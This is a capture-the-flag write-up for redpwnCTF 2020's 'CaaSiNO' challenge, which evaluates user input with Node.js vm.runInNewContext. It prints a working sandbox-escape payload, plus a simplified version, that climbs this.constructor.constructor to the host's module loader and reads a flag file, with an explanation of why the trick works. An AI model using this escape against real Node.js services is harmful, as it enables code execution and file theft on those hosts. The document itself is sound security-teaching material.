# CaaSiNO

> Who needs regex for sanitization when we have VMs?!?!
>
> The flag is at /ctf/flag.txt
>
> `nc 2020.redpwnc.tf 31273`

Provided file: `calculator.js`

Prerequisite topics: Not much. I guess knowing Node.js before could help but this is just a Google+copy+paste challenge.

## Reading the code

The code doesn't do much, except print out the result of:

```js
// line 19
const result = vm.runInNewContext(input)
```

## Investigating

Since the program hides all the errors away behind a generic error message, we can try running this function locally with the `node` REPL<sup id="a1">[1](#f1)</sup>.

```js
Welcome to Node.js v14.3.0.
Type ".help" for more information.
> const vm = require('vm')
undefined
> vm.runInNewContext("require('fs')")
evalmachine.<anonymous>:1
require('fs')
^

Uncaught ReferenceError: require is not defined
// (omitted error stack because unnecessary)
> vm.runInNewContext("process.version")
evalmachine.<anonymous>:1
process.version
^

Uncaught ReferenceError: process is not defined
// (omitted error stack because unnecessary)
```

It seems a lot of the usual node globals are not present in this new vm context. All I did next is Google "nodejs vm exploit" and follow the first link to [this site](https://codebottle.io/s/55c2243a21).

## Solution

After removing the newlines, and changing the ending to be `("util").format("%d", 5)`, the program prints out `5` as it should (`util.format` is just a format string function). We can then change the module from `"util"` to `"fs"` ([Node.js' file system module](https://nodejs.org/api/fs.html)), then use `readFileSync` to open a file synchronously (no callbacks or promises).

### Payload

`new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("fs").readFileSync("ctf/flag.txt")`

### What exactly did we just copy paste??

While copy-pasting from Google can be a fast and effective method to solve problems like these, it might be a good idea to investigate this payload.

An explanation can be found [here](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html).

Essentially, the payload uses the fact that `this` is still defined and is actually part of the original program scope (the one that called `vm.runInNewContext`). Then, we can use `this` by calling `.constructor` to reach the Object constructor, then `.constructor` again to reach the Function constructor. The function constructor can then be given a string to create a function in the global scope. I'm not actually sure why the original payload is so long, because I was able to simplify it quite a bit into the following:

```js
this.constructor.constructor(
  'return this.process.mainModule.constructor._load("fs").readFileSync("ctf/flag.txt")'
)()
```

---

<b id="f1">1</b> [REPL stands for Read, Evaluate, Print, Loop](https://en.wikipedia.org/wiki/Read%E2%80%93eval%E2%80%93print_loop). Basically just runs input that we give it live instead of writing a script and running it all at once. Good for testing random stuff. [↩](#a1)
